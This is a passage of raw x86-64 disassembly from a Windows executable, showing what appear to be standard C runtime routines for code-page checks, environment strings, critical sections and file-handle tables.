   140008714:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008719:	57                   	push   %rdi
   14000871a:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   140008720:	45 8b d9             	mov    %r9d,%r11d
   140008723:	83 f8 01             	cmp    $0x1,%eax
   140008726:	49 8b d8             	mov    %r8,%rbx
   140008729:	41 0f 96 c2          	setbe  %r10b
   14000872d:	33 ff                	xor    %edi,%edi
   14000872f:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   140008735:	77 1c                	ja     0x140008753
   140008737:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   14000873d:	83 f8 09             	cmp    $0x9,%eax
   140008740:	77 0c                	ja     0x14000874e
   140008742:	41 b8 a7 02 00 00    	mov    $0x2a7,%r8d
   140008748:	41 0f a3 c0          	bt     %eax,%r8d
   14000874c:	72 33                	jb     0x140008781
   14000874e:	83 f9 2a             	cmp    $0x2a,%ecx
   140008751:	eb 26                	jmp    0x140008779
   140008753:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   140008759:	74 26                	je     0x140008781
   14000875b:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   140008761:	76 18                	jbe    0x14000877b
   140008763:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   140008769:	76 16                	jbe    0x140008781
   14000876b:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   140008771:	74 0e                	je     0x140008781
   140008773:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140008779:	74 06                	je     0x140008781
   14000877b:	0f ba f2 07          	btr    $0x7,%edx
   14000877f:	eb 02                	jmp    0x140008783
   140008781:	8b d7                	mov    %edi,%edx
   140008783:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140008788:	45 84 d2             	test   %r10b,%r10b
   14000878b:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140008790:	4c 8b c0             	mov    %rax,%r8
   140008793:	4c 0f 45 c7          	cmovne %rdi,%r8
   140008797:	4c 0f 45 cf          	cmovne %rdi,%r9
   14000879b:	74 07                	je     0x1400087a4
   14000879d:	48 85 c0             	test   %rax,%rax
   1400087a0:	74 02                	je     0x1400087a4
   1400087a2:	89 38                	mov    %edi,(%rax)
   1400087a4:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   1400087a9:	4c 8b c3             	mov    %rbx,%r8
   1400087ac:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   1400087b1:	45 8b cb             	mov    %r11d,%r9d
   1400087b4:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   1400087b9:	5f                   	pop    %rdi
   1400087ba:	48 ff 25 df 69 00 00 	rex.W jmp *0x69df(%rip)        # 0x14000f1a0
   1400087c1:	cc                   	int3
   1400087c2:	cc                   	int3
   1400087c3:	cc                   	int3
   1400087c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400087c9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400087ce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400087d3:	57                   	push   %rdi
   1400087d4:	48 83 ec 20          	sub    $0x20,%rsp
   1400087d8:	ff 15 ca 69 00 00    	call   *0x69ca(%rip)        # 0x14000f1a8
   1400087de:	33 ed                	xor    %ebp,%ebp
   1400087e0:	48 8b d8             	mov    %rax,%rbx
   1400087e3:	48 85 c0             	test   %rax,%rax
   1400087e6:	74 63                	je     0x14000884b
   1400087e8:	48 8b f3             	mov    %rbx,%rsi
   1400087eb:	66 39 28             	cmp    %bp,(%rax)
   1400087ee:	74 1a                	je     0x14000880a
   1400087f0:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400087f4:	48 ff c0             	inc    %rax
   1400087f7:	66 39 2c 46          	cmp    %bp,(%rsi,%rax,2)
   1400087fb:	75 f7                	jne    0x1400087f4
   1400087fd:	48 8d 34 46          	lea    (%rsi,%rax,2),%rsi
   140008801:	48 83 c6 02          	add    $0x2,%rsi
   140008805:	66 39 2e             	cmp    %bp,(%rsi)
   140008808:	75 e6                	jne    0x1400087f0
   14000880a:	48 2b f3             	sub    %rbx,%rsi
   14000880d:	48 83 c6 02          	add    $0x2,%rsi
   140008811:	48 d1 fe             	sar    $1,%rsi
   140008814:	48 03 f6             	add    %rsi,%rsi
   140008817:	48 8b ce             	mov    %rsi,%rcx
   14000881a:	e8 9d 09 00 00       	call   0x1400091bc
   14000881f:	48 8b f8             	mov    %rax,%rdi
   140008822:	48 85 c0             	test   %rax,%rax
   140008825:	74 11                	je     0x140008838
   140008827:	4c 8b c6             	mov    %rsi,%r8
   14000882a:	48 8b d3             	mov    %rbx,%rdx
   14000882d:	48 8b c8             	mov    %rax,%rcx
   140008830:	e8 7b 59 00 00       	call   0x14000e1b0
   140008835:	48 8b ef             	mov    %rdi,%rbp
   140008838:	33 c9                	xor    %ecx,%ecx
   14000883a:	e8 ad ec ff ff       	call   0x1400074ec
   14000883f:	48 8b cb             	mov    %rbx,%rcx
   140008842:	ff 15 68 69 00 00    	call   *0x6968(%rip)        # 0x14000f1b0
   140008848:	48 8b c5             	mov    %rbp,%rax
   14000884b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008850:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008855:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000885a:	48 83 c4 20          	add    $0x20,%rsp
   14000885e:	5f                   	pop    %rdi
   14000885f:	c3                   	ret
   140008860:	40 53                	rex push %rbx
   140008862:	48 83 ec 20          	sub    $0x20,%rsp
   140008866:	33 db                	xor    %ebx,%ebx
   140008868:	48 8d 15 31 17 01 00 	lea    0x11731(%rip),%rdx        # 0x140019fa0
   14000886f:	45 33 c0             	xor    %r8d,%r8d
   140008872:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140008876:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   14000887a:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000887f:	e8 ac 11 00 00       	call   0x140009a30
   140008884:	85 c0                	test   %eax,%eax
   140008886:	74 11                	je     0x140008899
   140008888:	ff 05 42 19 01 00    	incl   0x11942(%rip)        # 0x14001a1d0
   14000888e:	ff c3                	inc    %ebx
   140008890:	83 fb 0e             	cmp    $0xe,%ebx
   140008893:	72 d3                	jb     0x140008868
   140008895:	b0 01                	mov    $0x1,%al
   140008897:	eb 09                	jmp    0x1400088a2
   140008899:	33 c9                	xor    %ecx,%ecx
   14000889b:	e8 24 00 00 00       	call   0x1400088c4
   1400088a0:	32 c0                	xor    %al,%al
   1400088a2:	48 83 c4 20          	add    $0x20,%rsp
   1400088a6:	5b                   	pop    %rbx
   1400088a7:	c3                   	ret
   1400088a8:	48 63 c1             	movslq %ecx,%rax
   1400088ab:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400088af:	48 8d 05 ea 16 01 00 	lea    0x116ea(%rip),%rax        # 0x140019fa0
   1400088b6:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400088ba:	48 ff 25 df 67 00 00 	rex.W jmp *0x67df(%rip)        # 0x14000f0a0
   1400088c1:	cc                   	int3
   1400088c2:	cc                   	int3
   1400088c3:	cc                   	int3
   1400088c4:	40 53                	rex push %rbx
   1400088c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400088ca:	8b 1d 00 19 01 00    	mov    0x11900(%rip),%ebx        # 0x14001a1d0
   1400088d0:	eb 1d                	jmp    0x1400088ef
   1400088d2:	48 8d 05 c7 16 01 00 	lea    0x116c7(%rip),%rax        # 0x140019fa0
   1400088d9:	ff cb                	dec    %ebx
   1400088db:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400088df:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400088e3:	ff 15 c7 67 00 00    	call   *0x67c7(%rip)        # 0x14000f0b0
   1400088e9:	ff 0d e1 18 01 00    	decl   0x118e1(%rip)        # 0x14001a1d0
   1400088ef:	85 db                	test   %ebx,%ebx
   1400088f1:	75 df                	jne    0x1400088d2
   1400088f3:	b0 01                	mov    $0x1,%al
   1400088f5:	48 83 c4 20          	add    $0x20,%rsp
   1400088f9:	5b                   	pop    %rbx
   1400088fa:	c3                   	ret
   1400088fb:	cc                   	int3
   1400088fc:	48 63 c1             	movslq %ecx,%rax
   1400088ff:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140008903:	48 8d 05 96 16 01 00 	lea    0x11696(%rip),%rax        # 0x140019fa0
   14000890a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000890e:	48 ff 25 93 67 00 00 	rex.W jmp *0x6793(%rip)        # 0x14000f0a8
   140008915:	cc                   	int3
   140008916:	cc                   	int3
   140008917:	cc                   	int3
   140008918:	40 53                	rex push %rbx
   14000891a:	48 83 ec 20          	sub    $0x20,%rsp
   14000891e:	33 db                	xor    %ebx,%ebx
   140008920:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140008924:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   14000892b:	00 00 
   14000892d:	48 8b 48 20          	mov    0x20(%rax),%rcx
   140008931:	39 59 08             	cmp    %ebx,0x8(%rcx)
   140008934:	7c 11                	jl     0x140008947
   140008936:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000893b:	e8 78 10 00 00       	call   0x1400099b8
   140008940:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140008945:	74 05                	je     0x14000894c
   140008947:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000894c:	8b c3                	mov    %ebx,%eax
   14000894e:	48 83 c4 20          	add    $0x20,%rsp
   140008952:	5b                   	pop    %rbx
   140008953:	c3                   	ret
   140008954:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008959:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000895e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008963:	57                   	push   %rdi
   140008964:	48 83 ec 20          	sub    $0x20,%rsp
   140008968:	ba 48 00 00 00       	mov    $0x48,%edx
   14000896d:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   140008970:	e8 ff ea ff ff       	call   0x140007474
   140008975:	33 f6                	xor    %esi,%esi
   140008977:	48 8b d8             	mov    %rax,%rbx
   14000897a:	48 85 c0             	test   %rax,%rax
   14000897d:	74 5b                	je     0x1400089da
   14000897f:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   140008986:	48 3b c5             	cmp    %rbp,%rax
   140008989:	74 4c                	je     0x1400089d7
   14000898b:	48 8d 78 30          	lea    0x30(%rax),%rdi
   14000898f:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   140008993:	45 33 c0             	xor    %r8d,%r8d
   140008996:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000899b:	e8 90 10 00 00       	call   0x140009a30
   1400089a0:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   1400089a5:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   1400089a9:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   1400089ad:	8b c6                	mov    %esi,%eax
   1400089af:	48 89 37             	mov    %rsi,(%rdi)
   1400089b2:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   1400089b9:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   1400089bd:	40 88 31             	mov    %sil,(%rcx)
   1400089c0:	ff c0                	inc    %eax
   1400089c2:	48 ff c1             	inc    %rcx
   1400089c5:	83 f8 05             	cmp    $0x5,%eax
   1400089c8:	72 f3                	jb     0x1400089bd
   1400089ca:	48 83 c7 48          	add    $0x48,%rdi
   1400089ce:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   1400089d2:	48 3b c5             	cmp    %rbp,%rax
   1400089d5:	75 b8                	jne    0x14000898f
   1400089d7:	48 8b f3             	mov    %rbx,%rsi
   1400089da:	33 c9                	xor    %ecx,%ecx
   1400089dc:	e8 0b eb ff ff       	call   0x1400074ec
   1400089e1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400089e6:	48 8b c6             	mov    %rsi,%rax
   1400089e9:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400089ee:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400089f3:	48 83 c4 20          	add    $0x20,%rsp
   1400089f7:	5f                   	pop    %rdi
   1400089f8:	c3                   	ret
   1400089f9:	cc                   	int3
   1400089fa:	cc                   	int3
   1400089fb:	cc                   	int3
   1400089fc:	48 85 c9             	test   %rcx,%rcx
   1400089ff:	74 4a                	je     0x140008a4b
   140008a01:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008a06:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008a0b:	57                   	push   %rdi
   140008a0c:	48 83 ec 20          	sub    $0x20,%rsp
   140008a10:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   140008a17:	48 8b d9             	mov    %rcx,%rbx
   140008a1a:	48 8b f9             	mov    %rcx,%rdi
   140008a1d:	48 3b ce             	cmp    %rsi,%rcx
   140008a20:	74 12                	je     0x140008a34
   140008a22:	48 8b cf             	mov    %rdi,%rcx
   140008a25:	ff 15 85 66 00 00    	call   *0x6685(%rip)        # 0x14000f0b0
   140008a2b:	48 83 c7 48          	add    $0x48,%rdi
   140008a2f:	48 3b fe             	cmp    %rsi,%rdi
   140008a32:	75 ee                	jne    0x140008a22
   140008a34:	48 8b cb             	mov    %rbx,%rcx
   140008a37:	e8 b0 ea ff ff       	call   0x1400074ec
   140008a3c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008a41:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008a46:	48 83 c4 20          	add    $0x20,%rsp
   140008a4a:	5f                   	pop    %rdi
   140008a4b:	c3                   	ret
   140008a4c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008a51:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008a56:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140008a5b:	41 57                	push   %r15
   140008a5d:	48 83 ec 30          	sub    $0x30,%rsp
   140008a61:	8b f1                	mov    %ecx,%esi
   140008a63:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   140008a69:	72 29                	jb     0x140008a94
   140008a6b:	e8 e4 e9 ff ff       	call   0x140007454
   140008a70:	bb 09 00 00 00       	mov    $0x9,%ebx
   140008a75:	89 18                	mov    %ebx,(%rax)
   140008a77:	e8 80 e7 ff ff       	call   0x1400071fc
   140008a7c:	8b c3                	mov    %ebx,%eax
   140008a7e:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008a83:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008a88:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140008a8d:	48 83 c4 30          	add    $0x30,%rsp
   140008a91:	41 5f                	pop    %r15
   140008a93:	c3                   	ret
   140008a94:	33 ff                	xor    %edi,%edi
   140008a96:	8d 4f 07             	lea    0x7(%rdi),%ecx
   140008a99:	e8 0a fe ff ff       	call   0x1400088a8
   140008a9e:	90                   	nop
   140008a9f:	8b df                	mov    %edi,%ebx
   140008aa1:	8b 05 39 1b 01 00    	mov    0x11b39(%rip),%eax        # 0x14001a5e0
   140008aa7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008aac:	3b f0                	cmp    %eax,%esi
   140008aae:	7c 36                	jl     0x140008ae6
   140008ab0:	4c 8d 3d 29 17 01 00 	lea    0x11729(%rip),%r15        # 0x14001a1e0
   140008ab7:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   140008abb:	74 02                	je     0x140008abf
   140008abd:	eb 22                	jmp    0x140008ae1
   140008abf:	e8 90 fe ff ff       	call   0x140008954
   140008ac4:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   140008ac8:	48 85 c0             	test   %rax,%rax
   140008acb:	75 05                	jne    0x140008ad2
   140008acd:	8d 78 0c             	lea    0xc(%rax),%edi
   140008ad0:	eb 14                	jmp    0x140008ae6
   140008ad2:	8b 05 08 1b 01 00    	mov    0x11b08(%rip),%eax        # 0x14001a5e0
   140008ad8:	83 c0 40             	add    $0x40,%eax
   140008adb:	89 05 ff 1a 01 00    	mov    %eax,0x11aff(%rip)        # 0x14001a5e0
   140008ae1:	48 ff c3             	inc    %rbx
   140008ae4:	eb c1                	jmp    0x140008aa7
   140008ae6:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008aeb:	e8 0c fe ff ff       	call   0x1400088fc
   140008af0:	8b c7                	mov    %edi,%eax
   140008af2:	eb 8a                	jmp    0x140008a7e
   140008af4:	48 63 d1             	movslq %ecx,%rdx
   140008af7:	4c 8d 05 e2 16 01 00 	lea    0x116e2(%rip),%r8        # 0x14001a1e0
   140008afe:	48 8b c2             	mov    %rdx,%rax
   140008b01:	83 e2 3f             	and    $0x3f,%edx
   140008b04:	48 c1 f8 06          	sar    $0x6,%rax
   140008b08:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140008b0c:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140008b10:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140008b14:	48 ff 25 85 65 00 00 	rex.W jmp *0x6585(%rip)        # 0x14000f0a0
   140008b1b:	cc                   	int3
   140008b1c:	48 63 d1             	movslq %ecx,%rdx
   140008b1f:	4c 8d 05 ba 16 01 00 	lea    0x116ba(%rip),%r8        # 0x14001a1e0
   140008b26:	48 8b c2             	mov    %rdx,%rax
   140008b29:	83 e2 3f             	and    $0x3f,%edx
   140008b2c:	48 c1 f8 06          	sar    $0x6,%rax
   140008b30:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140008b34:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140008b38:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140008b3c:	48 ff 25 65 65 00 00 	rex.W jmp *0x6565(%rip)        # 0x14000f0a8
   140008b43:	cc                   	int3
   140008b44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008b49:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008b4e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140008b53:	41 56                	push   %r14
   140008b55:	48 83 ec 20          	sub    $0x20,%rsp
   140008b59:	48 63 d9             	movslq %ecx,%rbx
   140008b5c:	85 c9                	test   %ecx,%ecx
   140008b5e:	78 72                	js     0x140008bd2
   140008b60:	3b 1d 7a 1a 01 00    	cmp    0x11a7a(%rip),%ebx        # 0x14001a5e0
   140008b66:	73 6a                	jae    0x140008bd2
   140008b68:	48 8b c3             	mov    %rbx,%rax
   140008b6b:	4c 8d 35 6e 16 01 00 	lea    0x1166e(%rip),%r14        # 0x14001a1e0
   140008b72:	83 e0 3f             	and    $0x3f,%eax
   140008b75:	48 8b f3             	mov    %rbx,%rsi
   140008b78:	48 c1 ee 06          	shr    $0x6,%rsi
   140008b7c:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   140008b80:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140008b84:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   140008b89:	74 47                	je     0x140008bd2
   140008b8b:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140008b91:	74 3f                	je     0x140008bd2
   140008b93:	e8 bc c7 ff ff       	call   0x140005354
   140008b98:	83 f8 01             	cmp    $0x1,%eax
   140008b9b:	75 27                	jne    0x140008bc4
   140008b9d:	85 db                	test   %ebx,%ebx
   140008b9f:	74 16                	je     0x140008bb7
   140008ba1:	2b d8                	sub    %eax,%ebx
   140008ba3:	74 0b                	je     0x140008bb0
   140008ba5:	3b d8                	cmp    %eax,%ebx
   140008ba7:	75 1b                	jne    0x140008bc4
   140008ba9:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140008bae:	eb 0c                	jmp    0x140008bbc
   140008bb0:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140008bb5:	eb 05                	jmp    0x140008bbc
   140008bb7:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140008bbc:	33 d2                	xor    %edx,%edx
   140008bbe:	ff 15 f4 65 00 00    	call   *0x65f4(%rip)        # 0x14000f1b8
   140008bc4:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140008bc8:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140008bce:	33 c0                	xor    %eax,%eax
   140008bd0:	eb 16                	jmp    0x140008be8
   140008bd2:	e8 7d e8 ff ff       	call   0x140007454
   140008bd7:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008bdd:	e8 52 e8 ff ff       	call   0x140007434
   140008be2:	83 20 00             	andl   $0x0,(%rax)
   140008be5:	83 c8 ff             	or     $0xffffffff,%eax
   140008be8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008bed:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008bf2:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140008bf7:	48 83 c4 20          	add    $0x20,%rsp
   140008bfb:	41 5e                	pop    %r14
   140008bfd:	c3                   	ret
   140008bfe:	cc                   	int3
   140008bff:	cc                   	int3
   140008c00:	48 83 ec 28          	sub    $0x28,%rsp
   140008c04:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140008c07:	75 15                	jne    0x140008c1e
   140008c09:	e8 26 e8 ff ff       	call   0x140007434
   140008c0e:	83 20 00             	andl   $0x0,(%rax)
   140008c11:	e8 3e e8 ff ff       	call   0x140007454
   140008c16:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008c1c:	eb 4e                	jmp    0x140008c6c
   140008c1e:	85 c9                	test   %ecx,%ecx
   140008c20:	78 32                	js     0x140008c54
   140008c22:	3b 0d b8 19 01 00    	cmp    0x119b8(%rip),%ecx        # 0x14001a5e0
   140008c28:	73 2a                	jae    0x140008c54
   140008c2a:	48 63 c9             	movslq %ecx,%rcx
   140008c2d:	4c 8d 05 ac 15 01 00 	lea    0x115ac(%rip),%r8        # 0x14001a1e0
   140008c34:	48 8b c1             	mov    %rcx,%rax
   140008c37:	83 e1 3f             	and    $0x3f,%ecx
   140008c3a:	48 c1 e8 06          	shr    $0x6,%rax
   140008c3e:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   140008c42:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140008c46:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   140008c4b:	74 07                	je     0x140008c54
   140008c4d:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   140008c52:	eb 1c                	jmp    0x140008c70
   140008c54:	e8 db e7 ff ff       	call   0x140007434
   140008c59:	83 20 00             	andl   $0x0,(%rax)
   140008c5c:	e8 f3 e7 ff ff       	call   0x140007454
   140008c61:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008c67:	e8 90 e5 ff ff       	call   0x1400071fc
   140008c6c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140008c70:	48 83 c4 28          	add    $0x28,%rsp
   140008c74:	c3                   	ret
   140008c75:	cc                   	int3
   140008c76:	cc                   	int3
   140008c77:	cc                   	int3
   140008c78:	8b 05 56 15 01 00    	mov    0x11556(%rip),%eax        # 0x14001a1d4
   140008c7e:	b9 00 40 00 00       	mov    $0x4000,%ecx
   140008c83:	85 c0                	test   %eax,%eax
   140008c85:	0f 44 c1             	cmove  %ecx,%eax
   140008c88:	89 05 46 15 01 00    	mov    %eax,0x11546(%rip)        # 0x14001a1d4
   140008c8e:	33 c0                	xor    %eax,%eax
   140008c90:	c3                   	ret
   140008c91:	cc                   	int3
   140008c92:	cc                   	int3
   140008c93:	cc                   	int3
   140008c94:	48 8b c4             	mov    %rsp,%rax
   140008c97:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008c9b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008c9f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140008ca3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140008ca7:	41 56                	push   %r14
   140008ca9:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140008cb0:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   140008cb4:	ff 15 ae 63 00 00    	call   *0x63ae(%rip)        # 0x14000f068
   140008cba:	45 33 f6             	xor    %r14d,%r14d
   140008cbd:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   140008cc3:	0f 84 9a 00 00 00    	je     0x140008d63
   140008cc9:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140008cce:	48 85 c0             	test   %rax,%rax
   140008cd1:	0f 84 8c 00 00 00    	je     0x140008d63
   140008cd7:	48 63 18             	movslq (%rax),%rbx
   140008cda:	48 8d 70 04          	lea    0x4(%rax),%rsi
   140008cde:	bf 00 20 00 00       	mov    $0x2000,%edi
   140008ce3:	48 03 de             	add    %rsi,%rbx
   140008ce6:	39 38                	cmp    %edi,(%rax)
   140008ce8:	0f 4c 38             	cmovl  (%rax),%edi
   140008ceb:	8b cf                	mov    %edi,%ecx
   140008ced:	e8 5a fd ff ff       	call   0x140008a4c
   140008cf2:	3b 3d e8 18 01 00    	cmp    0x118e8(%rip),%edi        # 0x14001a5e0
   140008cf8:	0f 4f 3d e1 18 01 00 	cmovg  0x118e1(%rip),%edi        # 0x14001a5e0
   140008cff:	85 ff                	test   %edi,%edi
   140008d01:	74 60                	je     0x140008d63
   140008d03:	41 8b ee             	mov    %r14d,%ebp
   140008d06:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140008d0a:	74 47                	je     0x140008d53
   140008d0c:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140008d10:	74 41                	je     0x140008d53
   140008d12:	f6 06 01             	testb  $0x1,(%rsi)
   140008d15:	74 3c                	je     0x140008d53
   140008d17:	f6 06 08             	testb  $0x8,(%rsi)
   140008d1a:	75 0d                	jne    0x140008d29
   140008d1c:	48 8b 0b             	mov    (%rbx),%rcx
   140008d1f:	ff 15 9b 64 00 00    	call   *0x649b(%rip)        # 0x14000f1c0
   140008d25:	85 c0                	test   %eax,%eax
   140008d27:	74 2a                	je     0x140008d53
   140008d29:	48 8b c5             	mov    %rbp,%rax
   140008d2c:	4c 8d 05 ad 14 01 00 	lea    0x114ad(%rip),%r8        # 0x14001a1e0
   140008d33:	48 8b cd             	mov    %rbp,%rcx
   140008d36:	48 c1 f9 06          	sar    $0x6,%rcx
   140008d3a:	83 e0 3f             	and    $0x3f,%eax
   140008d3d:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   140008d41:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   140008d45:	48 8b 03             	mov    (%rbx),%rax
   140008d48:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   140008d4d:	8a 06                	mov    (%rsi),%al
   140008d4f:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   140008d53:	48 ff c5             	inc    %rbp
   140008d56:	48 ff c6             	inc    %rsi
   140008d59:	48 83 c3 08          	add    $0x8,%rbx
   140008d5d:	48 83 ef 01          	sub    $0x1,%rdi
   140008d61:	75 a3                	jne    0x140008d06
   140008d63:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140008d6a:	00 
   140008d6b:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140008d6f:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140008d73:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140008d77:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140008d7b:	49 8b e3             	mov    %r11,%rsp
   140008d7e:	41 5e                	pop    %r14
   140008d80:	c3                   	ret
   140008d81:	cc                   	int3
   140008d82:	cc                   	int3
   140008d83:	cc                   	int3
   140008d84:	48 8b c4             	mov    %rsp,%rax
   140008d87:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008d8b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008d8f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140008d93:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140008d97:	41 56                	push   %r14
   140008d99:	48 83 ec 20          	sub    $0x20,%rsp
   140008d9d:	33 f6                	xor    %esi,%esi
   140008d9f:	45 33 f6             	xor    %r14d,%r14d
   140008da2:	48 63 ce             	movslq %esi,%rcx
   140008da5:	48 8d 3d 34 14 01 00 	lea    0x11434(%rip),%rdi        # 0x14001a1e0
   140008dac:	48 8b c1             	mov    %rcx,%rax
   140008daf:	83 e1 3f             	and    $0x3f,%ecx
   140008db2:	48 c1 f8 06          	sar    $0x6,%rax
   140008db6:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   140008dba:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   140008dbe:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   140008dc3:	48 83 c0 02          	add    $0x2,%rax
   140008dc7:	48 83 f8 01          	cmp    $0x1,%rax
   140008dcb:	76 0a                	jbe    0x140008dd7
   140008dcd:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   140008dd2:	e9 8b 00 00 00       	jmp    0x140008e62
   140008dd7:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
